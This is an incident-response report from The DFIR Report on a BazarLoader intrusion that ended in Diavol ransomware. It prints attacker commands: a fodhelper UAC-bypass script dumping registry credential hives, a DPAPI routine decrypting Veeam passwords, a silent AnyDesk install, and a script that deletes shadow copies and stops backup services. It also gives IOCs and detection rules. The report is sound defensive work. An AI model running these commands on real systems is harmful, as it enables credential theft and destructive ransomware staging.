# Diavol Ransomware
### In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 42 hours from initial access.

## Information:
+ Source: The DFIR Report
+ Link: https://thedfirreport.com/2021/12/13/diavol-ransomware/
+ Date: 2021-12-13T02:13:31+00:00
+ Author: editor


## Article:
![Article Image](https://thedfirreport.com/wp-content/uploads/2021/12/3.png)


In the past, threat actors have used BazarLoader to deploy Ryuk and Conti ransomware, as reported on many [occasions](https://thedfirreport.com/category/bazar/). In this intrusion, however, a BazarLoader infection resulted in deployment of Diavol Ransomware.


First discovered in June 2021, by [FortiGuard Labs](https://www.fortinet.com/blog/threat-research/diavol-new-ransomware-used-by-wizard-spider), Diavol Ransomware has been suspected to be linked to the [Wizard Spider](https://attack.mitre.org/groups/G0102/) threat actor. In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 32 hours from initial access.


### Case Summary


The malware (BazarLoader) was delivered to an endpoint via email, which included a link to OneDrive. The OneDrive link, directed the user to download a file that was a zip, which included an ISO inside. Once opened (mounted) on the users system, it was determined the ISO contained a LNK file and a DLL. The LNK file masqueraded as a Document enticing the user to click/open it. Once the user executed the LNK file, the BazarLoader infection was initiated.


As seen in previous cases, the BazarLoader infection began with internal reconnaissance of the environment using Windows utilities such as net, nltest, and ipconfig. After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL’s on the beachhead. This was followed by another round of discovery from the compromised machine. The threat actor then proceeded with execution of adf.bat, which is a script that queries various Active Directory objects using the AdFind tool. The first run was using a renamed binary named qq.exe and then the threat actor later dropped a properly named AdFind binary and executed the same discovery commands again. Soon after that, with the use of another simple batch script named fodhelper\_reg\_hashes.bat, they performed credentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives.


Returning after a gap of almost 18 hours, the threat actor performed another round of network scanning from the beachhead. This was then followed by attempts to Kerberoast and “AS-REProast” using the tool Rubeus. The threat actor then moved laterally via RDP to a server that contained file shares. After gaining access to the system they installed a remote access application, AnyDesk, as well as Filezilla.


The threat actors used FileZilla to exfiltrate data out of the environment. They then pivoted towards critical systems, such as domain controllers and a server that held backups. The threat actor then dumped LSASS from one of the domain controllers, using task manager, and then uploaded the dump file to [ufile.io](https://ufile.io/) using Internet Explorer.


On the backup server, the threat actors attempted to dump databases associated with the backup solution. In one attempt, they used a documented technique to recover the encoded password and decode it using the Microsoft Data Protection API (DPAPI).


After around 42 hours post initial intrusion, the threat actors pushed towards completion of their final objective. RDP access was established from the central file server that the threat actors had compromised to all endpoints and a batch script named “kill.bat” was executed on all of the targeted machines.


The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host. Once the script completed execution, the Diavol Ransomware was deployed via the RDP connection on each machine by running the executable manually. From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.


### Services


We offer multiple services including a [Threat Feed service](https://thedfirreport.com/services/) which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found [here](https://thedfirreport.com/services/).


We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our [Security Researcher and Organization](https://www.patreon.com/thedfirreport) services.


### Timeline


![](https://thedfirreport.com/wp-content/uploads/2021/12/Diavol-Ransomware.png)


Analysis and reporting completed by [@yatinwad](https://twitter.com/yatinwad) and AnonymousContributor1


Reviewed by [@tas\_kmanager](https://twitter.com/tas_kmanager) and [@samaritan\_o](https://twitter.com/samaritan_o)


### MITRE ATT&CK


### Initial Access


Initial access was via a OneDrive link that arrived via malicious emails that was reported via [@ankit\_anubhav](https://twitter.com/ankit_anubhav).



> 
> Stubborn [#Bazarloader](https://twitter.com/hashtag/Bazarloader?src=hash&ref_src=twsrc%5Etfw) hosted malware again on onedrive ( link still live ) with zip -> iso -> (lnk +DLL )
> 
> 
> /onedrive.live.com/download?cid=0094E8452D7CDD65&resid=94E8452D7CDD65%21135&authkey=AEN3yDYOia1YdKM
> 
> 
> Connects to /159.223.31.75/body/athlete<https://t.co/Hkg0UCBK85> [pic.twitter.com/VY4wRl8w5D](https://t.co/VY4wRl8w5D)
> 
> 
> — Ankit Anubhav (@ankit\_anubhav) [October 26, 2021](https://twitter.com/ankit_anubhav/status/1452957382087098373?ref_src=twsrc%5Etfw)
> 
> 



Upon accessing the link, a zip file was downloaded.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-2.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-2.png)


The original URL of the file can be traced from the file stream log data (Sysmon Event ID 15) as well.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-4.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-4.png)


Reviewing the file stream data from Sysmon we can see that the zip contains an ISO file.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-3.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-3.png)




[TheAnalyst](https://twitter.com/ffforward) reported similar BazarLoader activity via malicious emails around the same time frame.



> 
> Large [#BazarISO](https://twitter.com/hashtag/BazarISO?src=hash&ref_src=twsrc%5Etfw)>[#BazarLoader](https://twitter.com/hashtag/BazarLoader?src=hash&ref_src=twsrc%5Etfw)>[#BazarBackdoor](https://twitter.com/hashtag/BazarBackdoor?src=hash&ref_src=twsrc%5Etfw) inc from /muppetcast.com, started yesterday. Direct links to [@onedrive](https://twitter.com/onedrive?ref_src=twsrc%5Etfw). Iso contains dll+lnk running dll with entrypoint "EnterDll", your EDR might have problems detecting this, and less obvious for most users than maldocs… > [pic.twitter.com/ZS8sspWqtG](https://t.co/ZS8sspWqtG)
> 
> 
> — TheAnalyst (@ffforward) [October 13, 2021](https://twitter.com/ffforward/status/1448232486325080064?ref_src=twsrc%5Etfw)
> 
> 



### Execution


The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named “Documents.lnk” which executes the DLL via rundll32.exe.


![LNK File](https://thedfirreport.com/wp-content/uploads/2021/12/58e8364a54cbb2bf322755fccff03ad0c3ed48ba70ff988bbd1b75de2ee75e29 "enter image title here")


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/a5310880256ac70d3345b130b587933a71b5a70361f904681d32ddd9666436ad "enter image title here")


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/a550b6961e68854d024ceeec1d4b36fa28ef373b6891202a1923deb538356a36 "enter image title here")


After the initial execution, the malware contacted two of its C2 IPs:



```
159.223.31.75
206.189.49.239
```

We then observed threat actors dropping multiple Cobalt Strike Beacon DLL’s on the host in the following file paths:



```
C:\Users\<user>\AppData\Local\Temp\tfpkuengdlu.dll
C:\ProgramData\temp.dll
C:\Users\<>\AppData\Local\Temp\uvvfvnnswte.dll
```

![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/f328a0053ea4b48e92a0c05c9a69e84bc7dc27b2681f3d56ba6b226045ced85e "enter image title here")


![](https://thedfirreport.com/wp-content/uploads/2021/12/Beacons.png)


### Persistence


A new BITS job, named “Microsoft Office Manager upgrade v24.24” was created on the beachhead host.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-1.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-1.png)


The BITS job failed because the requested URL does not exist.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/87b4608057969d60d33b2b35d55b9d0c37970fe6f4b721f7423e381d1704c760 "enter image title here")


While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-10.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-10.png)


After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.


They used PowerShell and cmd to automate the download and installation of AnyDesk. In order to install Anydesk for unattended access you have to set a password. The password here was set to `J9kzQ2Y0qO`



```
(new-object System.Net.WebClient).DownloadFile("http://download.anydesk.com/AnyDesk.exe", "C:\ProgramData\AnyDesk.exe")
cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id

```

The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.


![](https://thedfirreport.com/wp-content/uploads/2021/12/3123.png)


From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients. Logs can be found at %programdata%\AnyDesk\ad\_svc.trace



```
IP: 23.106.215.31, Client-id: 903491377
```

![ad-svc.trace](https://thedfirreport.com/wp-content/uploads/2021/12/004e8b4c8dcc96face490df33986e1036c40baf9688a1e9af9212c3a6bd37ff1 "enter image title here")


### 


### Defense Evasion


The threat actors made use of process injection through-out the intrusion. The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL’s activity.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-5.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-5.png)


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-6.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-6.png)


Cobalt Strike processes were also observed injecting into various other processes.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-7.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-7.png)


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-9.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-9.png)


### Credential Access


Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named “fodhelper\_reg\_hashes.bat”.


Contents of fodhelper\_reg\_hashes.bat are as follows:



```
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\sam c:\ProgramData\sam.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\security c:\ProgramData\security.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\system c:\ProgramData\system.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
```

They also performed enumeration of the web browser information using [more](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/more).


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-11.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-11.png)


The following files were accessed:



```
Users\<>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
Users\<>\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
C:\Users\<>\AppData\Local\Temp\edge-cookies.json

```

Using a well known technique documented on the [Veeam backup forum,](https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html) the threat actor managed to decrypt passwords used by Veeam. The encryption method used by Veeam is [Data Protection API/DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection).


All the activity was done using RDP on the server with backups.


1. Dump the credentials using sqlcmd.exe to base64 passwords.



```
"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\sqlcmd.exe"  -S localhost,51341 -E -y0 -Q "SELECT TOP (1000) [id],[user\_name],[password],[usn],[description],[visible],[change\_time\_utc]FROM [VeeamBackup].[dbo].[Credentials];"

```

![](https://thedfirreport.com/wp-content/uploads/2021/12/3211.png)


2. Via RDP and notepad, they created a new file containing the code for the decryption routine.



```
"C:\Windows\system32\NOTEPAD.EXE" C:\Windows\Microsoft.NET\Framework\<version#>\veeam1.cs.txt
```

Content of **veeam1.cs.txt**



```
using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace Main
{
internal static class Program
   {
   private static void Decrypt(string b,string a){
      if (string.IsNullOrEmpty(a))
      {
         return;
      }
      byte[] encryptedData = Convert.FromBase64String(a);
      Console.WriteLine(b+':'+Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.LocalMachine)));
      return;
   }
   private static void Main(string[] args)
 {
         Decrypt("VATA","<BASE64 ENCODED PASSWORD HASH>");
      }
 }
}

```

![](https://thedfirreport.com/wp-content/uploads/2021/12/123.png)


3. Execute, which gave the threat actors passwords that were used by Veeam.



```
c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  veeam1.cs.txt
```

![](https://thedfirreport.com/wp-content/uploads/2021/12/222.png)


We also observed the threat actor using [Rubeus](https://github.com/GhostPack/Rubeus) to [kerberoast](https://adsecurity.org/?p=2293) and [asreproast](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/) the environment.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/rubeus.png)](https://thedfirreport.com/wp-content/uploads/2021/12/rubeus.png)


### Discovery


BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.



```
net group /domain admins
net group "Domain Computers" /domain
net localgroup administrator
net view /all
nltest /domain\_trusts /all\_trusts
```

Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat. This has been observed multiple times by different ransomware groups. The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.



```
qq.exe  -f "(objectcategory=person)" 
qq.exe  -f "objectcategory=computer"
qq.exe -f "(objectcategory=organizationalUnit)"
qq.exe -sc trustdmp
qq.exe -subnets -f (objectCategory=subnet)
qq.exe  -f "(objectcategory=group)"
qq.exe -gcb -sc trustdmp

```

The second time, they copy/pasted commands from adf.bat and executed them with AdFind.exe.


On the second day, the following commands were executed before they started working on moving laterally in the domain.



```
net group "Domain Admins" /domain
whoami
nslookup
ipconfig /all
systeminfo
tasklist
net group "Enterprise admins" /domain
net localgroup administrators
whoami /all
net use
query user

```

During the course of the intrusion, we observed execution of the utility “Advanced IP Scanner” to perform network scanning (over ports 21,80,445,4899,8080).


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/a2aee81594c2d040d3a8cdedc8283a08acbfb1eec5e9612abf9cd8b4a7a1d799 "enter image title here")


Advanced IP Scanner was downloaded using Internet Explorer on a server:


![](https://thedfirreport.com/wp-content/uploads/2021/12/4.png)


and then run with the portable option:


![](https://thedfirreport.com/wp-content/uploads/2021/12/5.png)


We also saw “MSSQLUDPScanner.exe” used for discovery of MSSQL instances across the environment.


![](https://thedfirreport.com/wp-content/uploads/2021/12/1.png)


We believe the tool used is [rvrsh3ll’s](https://twitter.com/424f424f) [MSSQLUDPScanner](https://github.com/rvrsh3ll/MSSQLUDPScanner)


![](https://thedfirreport.com/wp-content/uploads/2021/12/4444.png)


Comparing compiled version to executable from this intrusion


![](https://thedfirreport.com/wp-content/uploads/2021/12/1-1.png)


Before execution of AdFind.exe, adf.bat was run.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/2ae9aee76c1c5220cd055c948b5dc1abd23b8e7c75494e892c39de455b85a360 "enter image title here")


Via RDP they manually ran [Invoke-Sharefinder.ps1](https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1) on a server. It then looks like they manually copied the output to a file named shares.txt.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/89d4f93451f3c7a2268f161bd4b7bb7562112e9f9a9c80d2fe05cdd82d2e82b2 "enter image title here")


After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.


![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-16.png)


### Lateral Movement


We observed the threat actor using RDP as their main tool to do lateral movement in the environment. Most likely using credentials gathered through dumping of either lsass, or the registry hives. The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy. This also revealed their Workstation Name which is `WIN-799RI0TSTOF`.




---


![rdp](https://thedfirreport.com/wp-content/uploads/2021/12/8c9298ecb3c70b8d09f40a6696bc426223e0d65b18d483c0c6519b356b853e86 "enter image title here")




---


After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.


### Collection


The threat actors attempted to dump a database using [sqlcmd.exe](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver15) but the connection to the MSSQL server failed.



```
sqlcmd  -E -S localhost -Q "BACKUP DATABASE master TO DISK='c:\programdata\sql\master.bak'"
```

![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/f274c552091f80e3852d2f59aa3c2700ac8f9632c23e909784f19292ece860ca "enter image title here")


### Command and Control


**BazarLoader:**


206.189.49.239:443



```
JA3: 72a589da586844d7f0818ce684948eea
JA3s: 3f48aac872b1dbe54fa3547535ec9d43
```


```
Certificate: [3d:c3:4b:ff:95:d0:ae:52:f3:1e:18:e2:18:9e:0b:38:8c:f0:cf:b9 ]
Not Before: 2021/10/18 14:47:32 UTC 
Not After: 2022/10/18 14:47:32 UTC 
Issuer Org: Akdeniz Ltd. 
Subject Common: turkcell.info 
Subject Org: Akdeniz Ltd. 
Public Algorithm: id-ecPublicKey 
Curve: prime256v1
```


```
Subject: "emailAddress=goodmanshannon@stewart-cook.com,CN=turkcell.info,O=Akdeniz Ltd.,L=\\C3\\83\\C2\\87orluburgh,ST=Missouri,C=BE",

Issuer: "emailAddress=goodmanshannon@stewart-cook.com,CN=turkcell.info,O=Akdeniz Ltd.,L=\\C3\\83\\C2\\87orluburgh,ST=Missouri,C=BE",

Validation\_status: "self signed certificate",
```

159.223.31.75:443



```
JA3: 72a589da586844d7f0818ce684948eea
JA3s: 3f48aac872b1dbe54fa3547535ec9d43
```


```
Certificate: [be:b3:98:a3:a2:ce:e0:63:0b:7a:02:34:13:5b:0a:b5:4a:a4:21:71 ]
**Not Before:** 2021/10/18 14:47:32 UTC 
**Not After:** 2022/10/18 14:47:32 UTC 
**Issuer Org:** Åafak FÄ±rat Ltd. 
**Subject Common:** masomo.com 
**Subject Org:** Åafak FÄ±rat Ltd. 
**Public Algorithm:** id-ecPublicKey 
**Curve:** prime256v1
```

**Cobalt Strike C2:**


hiduwu.com  

108.62.141.87:443



```
JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767
```


```
Certificate: [a5:4e:ed:32:cd:76:a3:97:6b:ad:a1:df:42:36:6d:38:54:4c:a5:4e ]
Not Before: 2021/09/29 00:00:00 UTC 
Not After: 2022/09/29 23:59:59 UTC 
Issuer Org: Sectigo Limited 
Subject Common: hiduwu.com [hiduwu.com ,www.hiduwu.com ]
Public Algorithm: rsaEncryption
```

gawocag.com


23.81.246.32:443



```
JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767
```


```
Certificate: [32:be:aa:28:c6:bc:f3:f6:cf:31:c5:e5:2a:bf:1a:c1:a4:70:d1:6b ]
Not Before: 2021/10/11 00:00:00 UTC 
Not After: 2022/10/11 23:59:59 UTC 
Issuer Org: Sectigo Limited 
Subject Common: gawocag.com [gawocag.com ,www.gawocag.com ]
Public Algorithm: rsaEncryption
```


```
{
"x64": {
"sha256": "0cb20cf74f9c5896442c82f875e9221cae606ffa124e53d013b8d13b6988f8cc",
 "uri\_queried": "/fVWJ",
 "config": {
 "Spawn To x86": "%windir%\\syswow64\\rundll32.exe",
 "Watermark": 1580103814,
 "C2 Host Header": "",
 "HTTP Method Path 2": "/sm",
 "Beacon Type": "8 (HTTPS)",
 "Method 1": "GET",
 "Spawn To x64": "%windir%\\sysnative\\rundll32.exe",
 "Method 2": "POST",
 "C2 Server": "gawocag.com,/nd",
 "Jitter": 10,
 "Port": 443,
 "Polling": 5000
 },
 "sha1": "72db453ad1ab5ea483e5046864f3a8c295e7fef4",
 "time": 1634637833485.8,
 "md5": "abd213722fae891f54c28640d751200f"
 },
  "x86": {
 "sha256": "b08ae2fec4c0c64113947c14d9ab6f4a3e61a9d60e182b59e20b5b3606df8569",
 "uri\_queried": "/C5jz",
 "config": {
 "Spawn To x86": "%windir%\\syswow64\\rundll32.exe",
 "Watermark": 1580103814,
 "C2 Host Header": "",
 "HTTP Method Path 2": "/sm",
 "Beacon Type": "8 (HTTPS)",
 "Method 1": "GET",
 "Spawn To x64": "%windir%\\sysnative\\rundll32.exe",
 "Method 2": "POST",
 "C2 Server": "gawocag.com,/nd",
 "Jitter": 10,
 "Port": 443,
 "Polling": 5000
 },
 "sha1": "f3003f34c9cb595e94fa632b537bf5a76869954d",
 "time": 1634637826726,
 "md5": "3303703eef699663fd3f0982922e8e30"
 }

```

### Exfiltration


On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.


Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/12/d1eeb8b2115135c8123a0df44ce47a9d8dff2462ee01b3ab7cae84f613e454db "enter image title here")


Here we can see the threat actor actively exfiltrating our information using FileZilla.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-d6.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-d6.png)


We also saw the threat actors exfiltrate databases by dragging and dropping information into FileZilla.


![](https://thedfirreport.com/wp-content/uploads/2021/12/11111.png)


After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:


![](https://thedfirreport.com/wp-content/uploads/2021/12/55.png)


And then uploaded the dump file to [ufile.io](https://ufile.io/) using Internet Explorer on a server. ![Eyes on Apple iOS 14.6](https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/285/eyes_1f440.png)


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-d7.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-d7.png)


### Impact


On the third day, the threat actors began their final actions. The final actions took place from a compromised file server. They began with a ping sweep to locate all live hosts. After that completed, they reviewed the results on the host.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-12-r.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-12-r.png)


From a file server, the threat actors then established RDP connections to all the machines in the environment.  The threat actors transferred 2 files onto the machines they connected to. A batch script named kill.bat and a ransomware executable CryptoLocker64.exe.


The batch script is responsible for deletion of volume shadow copies, turning off automatic repairs and stopping all the running services on the host. Some of the commands are as follows:



```
sc  config "Netbackup Legacy Network service" start= disabled
bcdedit /set {default}
bcdedit /set {default} recoveryenabled No 
vssadmin.exe Delete Shadows /all /quiet
wmic.exe Shadowcopy Delete
net stop "Zoolz 2 Service" /y
net stop "Veeam Backup Catalog Data Service" /y
net stop "Symantec System Recovery" /y
net stop "SQLsafe Filter Service" /y
net stop "SQLsafe Backup Service" /y
net stop "SQL Backups" /y
net stop "Acronis VSS Provider" /y
net stop VeeamDeploySvc /y
net stop BackupExecVSSProvider /y
net stop BackupExecRPCService /y
net stop BackupExecManagementService /y
net stop BackupExecJobEngine /y
net stop BackupExecDeviceMediaService /y

```

After completion of this activity, the ransomware binary was executed manually over the RDP connections.


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-13-r.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-13-r.png)


From the threat actors starting their ping sweep, to final host encryption, about an hour passed leaving behind the ransom note for the organization to find. The threat actors went from initial access to domain wide ransomware in just under two days.




---


[![](https://thedfirreport.com/wp-content/uploads/2021/12/8099-r4-r.png)](https://thedfirreport.com/wp-content/uploads/2021/12/8099-r4-r.png)




---


### IOCs


Network



```
BazarLoader
turkcell[.]info
159.223.31[.]75
206.189.49[.]239

Cobalt Strike
23.81.246[.]32
gawocag.com
108.62.141[.]87
hiduwu.com

SFTP Exfiltration
192.52.167[.]210
23.152.0[.]22

```

File



```
Bazar
Documents.lnk
4d8af5ba95aa23f7162b7bbf8622d801
d5b8c1a219686be5b75e58c560609023b491d9aa
e87f9f378590b95de1b1ef2aaab84e1d00f210fd6aaf5025d815f33096c9d162

SharedFiles.dll
fb88f4d22f14ca09ddeeca5d312f4d9f
734205a694689db504418101b91c9981e3a12deb
c17e71c7ae15fdb02a4e22df4f50fb44215211755effd6e3fc56e7f3e586b299

Cobalt Strike
uvvfvnnswte.dll
69c68c62844966115c13dfee2e7bc58c
7f49ecaebe1c59c09587cee25fb8844c78a78665
5551fb5702220dfc05e0811b7c91e149c21ec01e8ca210d1602e32dece1e464d

tmp.dll
56c552097559ecbafedd5683038ca480
dc0699b1d1c5a99b75334b69dafce5fe86bcf6a3
493a1fbe833c419b37bb345f6f193517d5d9fd2577f09cc74b48b49d7d732a54

Tools
AdFind.exe
9b02dd2a1a15e94922be3f85129083ac
2cb6ff75b38a3f24f3b60a2742b6f4d6027f0f2a  
b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682

Rubeus.exe
6798ff540f3d077c3cda2f5a4a8559f7
40e8b04603f168b034c322be6c8b0afa5a9e89ac
0e09068581f6ed53d15d34fff9940dfc7ad224e3ce38ac8d1ca1057aee3e3feb

fodhelper_reg_hashes.bat
1e81900cc66fde050aef4c3149f1a375
f334b1b95f315f994c82da572e7acb68df4b17ed
9809bc0bea9bbfe31d47210391b124a724288b061d44dee5edc5e2582e36b271

MSSQLUDPScanner.exe
e6bef068c93cacdae7f15eded63461da
0390eacb29a580adf9870dbd3412f91d984a3197
bc88ae2c3353ee858a0dcdcd087bcd55f3c7eab0c702f7b295d2836565073730

veeam1.cs.exe
32d6f85c93bad9fa0f3eda1a8e80016
6e7628cd11dc76835e8cc0b2a91dc38101fcdb90
07f4a329f280d2896e1211ea79c73132be3a44e6c88819dea194e582bac18b3d

AnyDesk.exe
bd1c7369830ebd781ed5eade64f8f9e4
4f65118960bd8bcc744d62e6f464f8bc82c85a9e
4a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7

FileZillaPortable.exe
b56f93850ad1ba921d56fbfc0f6950ca
6bb01635f68264afb77268dedd4e3ca3125e8c37
3c53ccee435994cd8125be4ba09cd47dd64a3ffac00cce49327851541c50620

```

### Detections


#### Network


#### Snort:



```
ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software)
ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download
ET POLICY PE EXE or DLL Windows file download HTTP
ET INFO Packed Executable Download
[1:2850280:1] ETPRO TROJAN Observed Malicious SSL Cert (BazaLoader CnC) [Classification: A Network Trojan was Detected] [Priority: 1] {TCP}
```

#### Sigma


[AdFind Usage Detection](https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_ad_find_discovery.yml)


[Grabbing Sensitive Hives via Reg Utility](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_grabbing_sensitive_hives_via_reg.yml)


[Credentials Dumping Tools Accessing LSASS Memory](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/sysmon_cred_dump_lsass_access.yml)


[Suspicious Reconnaissance Activity](https://github.com/SigmaHQ/sigma/blob/f69868b5aa25f33c629208d8868994ed24b20b46/rules/windows/process_creation/win_susp_recon_activity.yml)


[Stop Windows Service](https://github.com/SigmaHQ/sigma/blob/eb406ba36fc607986970c09e53058af412093647/rules/windows/process_creation/win_service_stop.yml)


[AnyDesk Silent Installation](https://github.com/SigmaHQ/sigma/blob/dd2aa8706dac60e49cbf73a176a72061822fa8cf/rules/windows/process_creation/win_anydesk_silent_install.yml)


[Rubeus Hack Tool](https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_hack_rubeus.yml)


 


#### Yara



```
/*
   YARA Rule Set
   Author: The DFIR Report
   Date: 2021-12-12
   Identifier: files
   Reference: 8099 https://thedfirreport.com
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule uvvfvnnswte {
   meta:
      description = "8099 - file uvvfvnnswte.dll"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "5551fb5702220dfc05e0811b7c91e149c21ec01e8ca210d1602e32dece1e464d"
   strings:
      $s1 = "(s#u%x0m(m#n&y*r$o&k\"j*o$y&x\"k)l#k%y!l)y#u%j0m%v0w)w.n%k0q)l.o&p/s*m-p&u/m*v.q+j%o&s%r+w%y&p%s,t&k%q&t,q&u%r'u,n%w%o%v,s%q%t%w" ascii
      $s2 = "0w(r#v%l0j(l$u\"o*u$n&p\"v*p$x&k!q)k#j%r!x)v#t,y.k%y0v)t.r%l0p)w-m&o/r*n-t&r/l)m%w+m%n&x%n+x%x&s&y,s&j%j&p,n&t(q%s,q%v%l%j,t%p%o" ascii
      $s3 = "%r0v(y#p%k0k'w&m\"p*t$m&v\"y*q$k%w!n)j#q%l!w)w.o)y.l%x0u)j.u%m0s*k-j&n/y*x-s&s0w&u%x+l%m&n%q+y%k%o&v,r&q%t&o,o'o%q%t,p%u%r%m,u%s" ascii
      $s4 = "#t%s0u(j#o%j/x$p&j\"q*w$v&y\"x*r#l%x!o)q#r%k!v(l0x)v.m%s0n)m.t%v/t*l-k&m/j*w-r%p%p&r%y+o%v&q%p+j&l%p&w,y&r%s&n)t%x%n%u,k%n%u%l,n" ascii
